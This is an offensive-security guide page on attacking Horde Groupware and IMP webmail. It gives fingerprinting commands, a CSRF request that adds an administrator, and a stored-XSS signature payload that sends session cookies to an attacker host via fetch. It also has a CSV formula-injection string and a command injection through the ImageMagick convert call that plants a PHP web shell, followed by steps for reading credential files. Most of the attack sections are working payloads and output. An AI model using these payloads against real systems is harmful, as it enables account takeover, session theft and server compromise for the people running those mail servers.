---
title: "Horde: CSRF against admin, preference injection, and image-handler command injection"
order: 2
description: "Attacking the Horde Groupware and its IMP webmail: fingerprinting /horde/, cross-site request forgery that adds an administrator or rewrites preferences, injection through the Turba and preferences subsystems, and the Horde_Image convert command injection that reaches code execution on the server."
keywords:
  - horde webmail
  - horde csrf
  - horde_image command injection
  - horde imp
  - preference injection
---

# Horde

Horde is a PHP groupware framework; its webmail module is **IMP**, with contacts in **Turba** and shared libraries such as `Horde_Form`, `Horde_Prefs`, and `Horde_Image`. Two shapes of attack dominate. First, state-changing endpoints (administration, preferences) have repeatedly lacked anti-CSRF tokens or accepted forgeable requests, so a logged-in user visiting attacker content, or opening a crafted message, silently changes server state. Second, Horde's image and form helpers shell out to external binaries (`convert` from ImageMagick) and build command lines from attacker-influenced values, turning a webmail feature into command execution.

## Fingerprint first

```bash
curl -sk https://<target>/horde/ -i | grep -iE 'set-cookie|generator|location'
#   Set-Cookie: Horde=...                    confirms Horde
curl -sk https://<target>/horde/login.php -i | grep -i generator
curl -sk https://<target>/horde/services/help/ -i        # services tree presence
```

The cookie `Horde`, the `/horde/` root, and a `<meta name="generator" content="Horde ...">` tag identify the product; the generator tag and the JS asset paths under `/horde/js/` pin the framework and IMP versions, which select the live injection and command-injection paths.

## CSRF to administrator

Horde administration (`/horde/admin/`) manages users, configuration, and group membership. Where an admin action is driven by a plain GET/POST without a per-request token, a request forged from the admin's browser executes with the admin's session. The classic target is adding an administrator or rewriting a user's preferences so your account inherits privilege.

```http
POST /horde/admin/user.php HTTP/1.1
Host: target
Cookie: Horde=<victim-admin-session>
Content-Type: application/x-www-form-urlencoded

actionID=adduser&user_name=attacker&user_pass=Passw0rd!&user_pass2=Passw0rd!
```

Delivered as an auto-submitting form on a page the admin visits (or embedded so it fires when an administrator reads your message in IMP), the request runs in the admin context and provisions the account. Confirm by authenticating as the planted user:

```http
POST /horde/login.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

horde_user=attacker&horde_pass=Passw0rd!&login_post=1
```

A `Set-Cookie: Horde=...` with a logged-in redirect confirms the forged provisioning worked.

## Preference and Turba injection

Horde stores per-user preferences (`Horde_Prefs`) and contacts (`Turba`) and renders several of them back into HTML or into generated files. Two consequences:

- **Stored XSS through a preference or contact field.** A preference such as the signature, or a Turba contact field, that is stored without output encoding and later rendered in the authenticated UI runs script in the victim's session when they view it, exactly like the message-rendering case but reached through a saved field instead of an email body.
- **CSV formula injection on export.** Turba contact exports build a CSV whose cell values come from contact fields. A field beginning `=`, `+`, `-`, or `@` (for example `=cmd|'/c calc'!A1`) is interpreted as a formula when the victim opens the export in a spreadsheet, running on their workstation rather than the server. This is the `Text_Filter`/CSV path.

```http
POST /horde/services/prefs.php HTTP/1.1
Host: target
Cookie: Horde=<session>
Content-Type: application/x-www-form-urlencoded

actionID=update_prefs&group=signature&signature=<img src=x onerror=fetch('//attacker/?'+document.cookie)>
```

When the victim next opens the composer or views their signature, the stored payload executes in the `https://<target>/horde` origin and leaks the session.

## Image-handler command injection to RCE

`Horde_Image` renders and transforms images (thumbnails, CAPTCHA, calendar graphics) by invoking an external binary, typically ImageMagick's `convert`, with a command line assembled from configuration and request-influenced parameters. Where a dimension, context, or filename value flows unquoted into that command line, shell metacharacters break out and run as the web user. The reachable triggers include the image context processed on certain IMP/Kronolith actions.

```http
POST /horde/imp/ HTTP/1.1
Host: target
Cookie: Horde=<session>
Content-Type: application/x-www-form-urlencoded

actionID=...&context=thumbnail&ctx[...]=;id>/tmp/o;&...
```

The injected `;id>/tmp/o;` is executed when Horde builds and runs the `convert` command line. Confirm and read output through any file the web user can serve, or redirect into the webroot:

```http
POST /horde/imp/ HTTP/1.1
Host: target
Cookie: Horde=<session>

...ctx[...]=;echo '<?php system($_GET[c]);?>'>/var/www/horde/sh.php;...
```

```http
GET /horde/sh.php?c=id HTTP/1.1
Host: target
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The `www-data` output confirms command execution on the server as the web user.

## Exploitation notes

- The CSRF and preference paths need a **victim with a session** (an admin for provisioning, any user for XSS); deliver the trigger by email so it fires in IMP, or host it where the target will load it.
- The `Horde_Image`/`convert` path is a **server-side** RCE as the web user and usually needs an authenticated session to reach the image action; chain it after a CSRF-provisioned or sprayed account.
- After web-user execution, read `/var/www/horde/config/conf.php` for the database and IMAP/SMTP backend credentials, turning one account into the whole mail store.
- ImageMagick itself adds a second route: a crafted image delegate (the `MSL`/`ephemeral`/`https` coder abuse, "ImageTragick") processed by the same `convert` call reaches code execution even where the command line is quoted.

## Tools

- [horde/horde (source, to locate the vulnerable action and command assembly)](https://github.com/horde/horde)
- Burp Suite for crafting the CSRF form and the injected parameter.

## References

- [Horde project source and release notes](https://github.com/horde)
- [ImageMagick security (delegate / coder abuse)](https://imagemagick.org/script/security-policy.php)
- [OWASP: CSV injection](https://owasp.org/www-community/attacks/CSV_Injection)
